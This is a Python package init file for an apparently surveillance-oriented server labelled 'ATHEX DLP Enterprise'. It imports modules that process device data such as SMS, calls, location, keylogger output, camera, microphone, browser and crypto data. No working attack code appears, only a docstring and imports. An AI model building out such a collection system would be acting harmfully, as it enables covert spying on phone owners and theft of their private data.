# ATHEX DLP Framework - server/modules/__init__.py
"""
ATHEX DLP Enterprise - Server Modules
======================================
Data handling modules for processing client responses.

Each module handles a specific data type:
- Contacts, SMS, Calls, Files, Location
- Notifications, Clipboard, Apps, WiFi
- Camera, Microphone, Keylogger
- Browser, Social Media, Crypto, Screen

All modules follow a consistent interface:
- process(data): Process incoming raw data
- format_for_dashboard(data): Format for web display
- store(data): Store in database if needed
"""

__version__ = '2.0.0'

# Import all modules for easy access
from . import contacts
from . import sms
from . import calls
from . import files
from . import location
from . import notifications
from . import clipboard
from . import apps
from . import camera
from . import microphone
from . import keylogger
from . import browser
from . import social
from . import crypto
from . import screen